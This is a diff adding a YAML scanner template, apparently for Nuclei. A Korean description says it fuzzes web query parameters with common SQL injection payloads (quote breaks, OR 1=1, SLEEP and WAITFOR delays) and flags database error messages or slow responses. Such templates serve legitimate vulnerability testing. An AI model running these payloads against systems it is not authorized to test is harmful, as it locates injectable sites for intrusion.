@@ -1,0 +1,82 @@
+id: sqli-fuzzing-common-payloads
+
+info:
+  name: SQL Injection Fuzzing with Common Payloads
+  author: security-researcher
+  severity: high
+  description: |
+    자주 사용되는 SQL 인젝션 페이로드를 대량으로 퍼징하여 취약점을 탐지합니다.
+    다양한 데이터베이스와 인젝션 유형을 포괄적으로 테스트합니다.
+  tags: sqli,fuzzing,injection,comprehensive
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      param:
+        - "id"
+        - "page"
+        - "cat"
+        - "product"
+        - "user"
+        - "name"
+        - "sort"
+        - "ref"
+      sqli:
+        # 기본 에러 탐지
+        - "'"
+        - "\""
+        - "`"
+        - "')"
+        - "'))"
+        - "'--"
+        - "'#"
+        - "'/*"
+        # OR 기반
+        - "' OR 1=1--"
+        - "' OR '1'='1"
+        - "\" OR 1=1--"
+        - "1 OR 1=1"
+        # AND 기반
+        - "' AND 1=1--"
+        - "' AND 1=2--"
+        - "1 AND 1=1"
+        - "1 AND 1=2"
+        # 주석
+        - "'--"
+        - "'#"
+        - "--"
+        - "#"
+        # 시간 기반
+        - "' AND SLEEP(3)--"
+        - "1 AND SLEEP(3)"
+        - "'; WAITFOR DELAY '0:0:3'--"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{param}}={{sqli}}"
+
+    attack: clusterbomb
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "sql.*error|syntax.*error|database.*error"
+          - "you have an error in your sql"
+          - "ORA-\\d{5}"
+          - "Microsoft OLE DB"
+          - "PostgreSQL.*ERROR"
+          - "warning: mysql"
+        condition: or
+        case-insensitive: true
+
+      - type: dsl
+        dsl:
+          - "duration >= 3000"
